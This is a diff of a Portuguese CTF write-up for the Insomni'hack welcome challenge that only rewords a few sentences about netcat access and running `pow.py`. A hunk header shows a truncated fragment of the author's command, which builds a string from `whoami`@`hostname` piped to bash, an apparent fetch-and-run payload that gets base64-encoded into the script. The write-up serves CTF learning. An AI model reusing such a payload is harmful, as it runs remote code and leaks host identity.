@@ -5,7 +5,7 @@ Essa foi a Chall inicial do CTF que, apesar de ser um pouco mais complexas que a
 Primeiro vamos ver o anúncio da Chall
 ![description](description.png)
 
-Então aqui, temos um arquivo (pow) para baixar e um alvo que podemos acessar via Netcat (nc welcome.insomnihack.ch 1337).
+Então aqui, temos um arquivo chamado `pow` para baixar e um alvo que podemos acessar via Netcat (nc welcome.insomnihack.ch 1337).
 
 Primeiro vamos executar o comando no terminal e vermos a saida
 ```bash
@@ -50,7 +50,7 @@ echo -n 'global i;x=os.name;x+="/$(whoami)@$(hostname)|bash"if x!="nt"else"/%USE
 
 Agora que temos nosso base64 correto, vamos editar o arquivo `pow.py` na linha `18` e substituí-lo pelo encode correto.
 
-Feito isso, vamos executar novamente o comando `nc welcome.insomnihack.ch 1337` e em outro terminal, executar o arquivo `pow.py`.
+Feito isso, só precisamos executar novamente o comando `nc welcome.insomnihack.ch 1337` e em outro terminal, executar o arquivo `pow.py`.
 
 ![flag](flag.png)
 
